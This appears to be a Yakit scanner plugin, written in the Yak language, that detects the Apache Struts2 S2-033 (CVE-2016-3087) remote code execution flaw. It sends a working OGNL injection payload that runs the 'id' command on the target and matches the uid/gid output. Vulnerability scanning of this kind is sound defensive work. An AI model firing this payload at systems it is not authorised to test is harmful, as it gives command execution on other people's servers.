# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAnyOfRegexp(rsp, `uid=[0-9]+\(.*\) gid=[0-9]+\(.*\) groups=[0-9]+\(.*\)`) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) {
            yakit.Info("%v found ApacheSturts2(s2-033)_CVE-2016-3087远程代码执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("ApacheSturts2(s2-033)_CVE-2016-3087远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("ApacheSturts2(s2-033)_CVE-2016-3087远程代码执行漏洞存在"),
            risk.type("RCE[ApacheSturts2]"),
            risk.payload(`flush%28%29,%23xx%3d123,%23xx.toString.json?&command=id`),
            risk.details({
                "req": string(req),
                "rsp": string(rsp),
            }),
        )
        }else{
            println("不存在ApacheSturts2(s2-033)_CVE-2016-3087远程代码执行漏洞")
            }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23process%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%2C@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%2C%23ros.flush%28%29,%23xx%3d123,%23xx.toString.json?&command=id`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}